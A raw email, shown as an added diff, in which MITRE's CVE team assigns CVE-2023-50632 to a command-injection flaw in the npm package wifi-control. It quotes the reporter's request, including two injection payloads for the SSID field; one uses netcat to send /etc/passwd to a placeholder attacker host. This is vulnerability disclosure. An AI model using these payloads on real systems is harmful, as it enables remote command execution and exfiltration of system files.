@@ -1,0 +1,164 @@
+Received: from hust.edu.cn (unknown [172.16.0.52])
+	by app1 (Coremail) with SMTP id HgEQrABHKdmuiYBlW9n6AA--.53985S2;
+	Tue, 19 Dec 2023 02:04:30 +0800 (CST)
+Received: from mx0f-00007b01.gpphosted.com (unknown [67.231.155.183])
+	by gateway (Coremail) with SMTP id _____wCXn8uqiYBl0gURAA--.6133S3;
+	Tue, 19 Dec 2023 02:04:28 +0800 (CST)
+Received: from pps.filterd (m0368554.ppops.net [127.0.0.1])
+	by mx0f-00007b01.gpphosted.com (8.17.1.19/8.17.1.19) with ESMTP id 3BIEV7fb008350
+	for <liyue2021@hust.edu.cn>; Mon, 18 Dec 2023 18:04:26 GMT
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mitre.org; h=date : from : to :
+ subject : cc : message-id : mime-version : content-type :
+ content-transfer-encoding; s=pps1;
+ bh=Hc7ZFHOcdfbbd4zNfMi8SiHzgbUHvjs2tzfoyk9NAFM=;
+ b=nGCcJ1BRUzDQPERBzxggTgTKd6aB1wa9TNK1AQkfDEvWUGQr18LctUKVs9rqUa64Zr1L
+ 4t+sn2+VjZ4BQz6kYa04PGmVhhNpAR0cIBFNcks2uKTSveRpDoLtRKuOAbD/OcZ4Z1Si
+ PSeDZWfRP1GBHsMQWEDSfaiseS7IIzhdPu8zNjnzL4f7ipF35AbroPALOu/sVMYMGXha
+ hAqA/Klz4Tk/Mke28ocOX+vElcbs+mbEwkCgiNC8B+RcZpZzKI4ELE5/cyAED/1xUyf1
+ hRHXNMNRLK2fd/o19vYuxKk8gN7EyjrN4jghXD3YNgGCgi5g36A0MpNckVMaoyOZ9Mjw 0g== 
+Received: from smtpyrhbv1.mitre.org ([198.49.146.45])
+	by mx0f-00007b01.gpphosted.com (PPS) with ESMTPS id 3v2qwrru31-1
+	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT)
+	for <liyue2021@hust.edu.cn>; Mon, 18 Dec 2023 18:04:26 +0000
+Received: from smtprhbv1.mitre.org (smtprhbv1.mitre.org [10.20.0.16])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by smtpyrhbv1.mitre.org (Postfix) with ESMTPS id 7E1D5C16847
+	for <liyue2021@hust.edu.cn>; Mon, 18 Dec 2023 13:04:25 -0500 (EST)
+Received: from cvecmssrv1.mitre.org (cvecmssrv1.mitre.org [10.20.0.168])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by smtprhbv1.mitre.org (Postfix) with ESMTPS id 67B8592FB4B;
+	Mon, 18 Dec 2023 13:04:25 -0500 (EST)
+Received: from cvecmssrv1.mitre.org (localhost.localdomain [127.0.0.1])
+	by cvecmssrv1.mitre.org (8.14.4/8.13.1) with ESMTP id 3BII4Pij017092;
+	Mon, 18 Dec 2023 13:04:25 -0500
+Received: (from cve@localhost)
+	by cvecmssrv1.mitre.org (8.14.4/8.14.4/Submit) id 3BII4Pw7017089;
+	Mon, 18 Dec 2023 13:04:25 -0500
+X-Authentication-Warning: cvecmssrv1.mitre.org: cve set sender to cve-request@mitre.org using -r
+Date: Mon, 18 Dec 2023 13:04:25 -0500
+From: cve-request@mitre.org
+To: liyue2021@hust.edu.cn
+Subject: =?utf-8?B??= Re: [scr1570159] your CVE ID requests
+Cc: cve-request@mitre.org
+Message-ID: <658089a9.EG1AgGk9Huf1iO1i%cve-request@mitre.org>
+User-Agent: Heirloom mailx 12.4 7/29/08
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+X-Proofpoint-Virus-Version: vendor=nai engine=6600 definitions=10928 signatures=596816
+X-CM-TRANSID:_____wCXn8uqiYBl0gURAA--.6133S3
+X-Coremail-Spam: 1
+Authentication-Results: app1; spf=neutral smtp.mail=cve-request@mitre.
+	org;
+X-Coremail-Antispam: 1UD129KBjvJXoWxJw4kKw45ZFyDWw15KFyrXrb_yoW5Aw18pr
+	1ayr17Wr1UJr18Cr1xGr1UXr1UXrs8Jr1UJr1DJr1kZr15Ar1UJr1j9r1rXryDJry8Xr1U
+	Zr1UX3WkJr1UAr7anT9S1TB71UUUUUUqnTZGkaVYY2UrUUUU0bIjqfuFe4nvWSU5nxnvy2
+	9KBjDU0xBIdaVrnRJUUU9mb7Iv0xC_Kw4lb4IE77IF4wAFz4v204v26x8ErcxFaVAv8VW5
+	Xr1UJr1l8cAvFVAK0II2c7xJM28CjxkF64kEwVA0rcxSw2x7M28EF7xvwVC0I7IYx2IY67
+	AKxVWUJVWUCwA2z4x0Y4vE2Ix0cI8IcVCY1x0267AKxVWUJVW8JwA2z4x0Y4vEx4A2jsIE
+	14v26r1j6r4UM28EF7xvwVC2z280aVCY1x0267AKxVWUJVW8JwAS0I0E0xvYzxvE52x082
+	IY62kv0487Mc02F40EFcxC0VAKzVAqx4xG6I80ewAv7VACjcxG62k0Y48FwI0_Cr0_Gr1U
+	McIj6x8ErcxFaVAv8VW8uFyUJr1UMcIj6xkF7I0En7xvr7AKxVWxJVW8Jr1lOx8S6xCaFV
+	Cjc4AY6r1j6r4UM4kE6xkIj40Ew7xC0wCjxxvEw4Wlc2IjII80xcxEwVAKI48JMxvI42IY
+	6xIIjxv20xvE14v26r1j6r1xMxvI42IY6xIIjxv20xvEc7CjxVAFwI0_Jr0_Gr1lcIIF0x
+	vEx4A2jsIE14v26r1j6r4UMxvI42IY6I8E87Iv6xkF7I0E14v26r1j6r4UMxAIw28IcxkI
+	7VAKI48JMxAIw28IcVCjz48v1sIEY20_GFW3Jr1UJwCF72vEw2IIxxk0rwCFx2IqxVCFs4
+	IE7xkEbVWUJVW8JwC20s026c02F40E14v26r1j6r18MI8I3I0E7480Y4vE14v26r106r1r
+	MI8E67AF67kF1VAFwI0_Jrv_JF1lIxkGc2Ij64vIr41lIxAIcVCF04k26cxKx2IYs7xG6r
+	1j6r1xYxBIdaVFxhVjvjDU0xZFpf9x07bToGQUUUUU=
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+
+> [Suggested description]
+> AN issue in msolters Wifi-Control-Node v.2.0.1 and before allows an
+> attacker to execute arbitrary code via a crafted payload to the
+> lib/linux.js file.
+> 
+> ------------------------------------------
+> 
+> [Additional Information]
+> https://github.com/sdpyly/bug_report_wifi-control
+> 
+> ------------------------------------------
+> 
+> [VulnerabilityType Other]
+> Command Injection, CWE-78
+> 
+> ------------------------------------------
+> 
+> [Vendor of Product]
+> https://www.npmjs.com/package/wifi-control   https://github.com/msolters/wifi-control-node
+> 
+> ------------------------------------------
+> 
+> [Affected Product Code Base]
+> wifi-control - <= 2.0.1
+> 
+> ------------------------------------------
+> 
+> [Affected Component]
+> There is a command injection vulnerability in lib/linux.js file, line 170. _ap.ssid is not checked. The detail is in https://github.com/sdpyly/bug_report_wifi-control
+> 
+> ------------------------------------------
+> 
+> [Attack Type Other]
+> node module import
+> 
+> ------------------------------------------
+> 
+> [Impact Code execution]
+> true
+> 
+> ------------------------------------------
+> 
+> [Impact Information Disclosure]
+> true
+> 
+> ------------------------------------------
+> 
+> [Attack Vectors]
+> Payload1: " || touch hack.txt && "
+> Payload2: " || nc {hostIP} {port} < /etc/passwd &&"
+> The detail is in https://github.com/sdpyly/bug_report_wifi-control
+> 
+> ------------------------------------------
+> 
+> [Reference]
+> https://github.com/sdpyly/bug_report_wifi-control
+> https://cwe.mitre.org/data/definitions/78.html
+> 
+> ------------------------------------------
+> 
+> [Discoverer]
+> YorkLee
+
+Use CVE-2023-50632.
+
+
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+ [ A PGP key is available for encrypted communications at
+   https://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCAAGBQJlgIj7AAoJENiPHH3233OGc20P/j6NYDLKSswY9fBzg3XGc+2B
+Oyj3Lo52n4PJe8Jj67R2R4KYnk/Mfer8mdJBz4CQy/Hwe4QmOF7RlPFYxc77tKeL
+WQhbLI5vnXB/Z6aD7ELehxLPL4dJgRqJF/cdx7xC5LRqSpq9QoBS+g2X7mCU3lxE
+1cMS1lMs8bp/SdJGnnX9eQe/LWt7vYGereEIvLtmdos6q8LLxTZyG3QKnaEP+duv
+yQQuuZLwR713Q3zmsZRlwdnB/pTm8rb/wDut5n1XbswEcWQswNV3C9S8H0HSzydF
+0VHViTrIBFXKm3AP6Lmo8D7XNTu3PBoX18bKwUQu38o2d18ch6FGcPRYJ679QIW5
+sdDEpUobaGaVIX6Iqya0LTjzevuqCaa34CMJhavyX1X46A73hg5gkruy7l5E54lY
+qb/AhXoyUbWBkVfhB6vJgyLAZjxYfPceEWAQx4acf6hAZrqqqWntxNJcyvtl+jfu
+z2liJ7bKk1DuN6+QWecvBpBhJoLmDhm/T+pNGPM+lxqV0RMzgw7K8EaEPuPQSB7z
+Y1oXDmJNdYljIULKRIW/KnogAAOnt0WPV0pAXK0BkK758qg9RyEQJ5JASPY7jP/i
+PcxRZX38HB3jld9D1ndqUyTjCRkKm3GhJBhfaL+Qjl4t1Uf4fwC27u21BRe0UiB3
+gIbQYYaEAKbtO0c/RsAa
+=VPks
+-----END PGP SIGNATURE-----
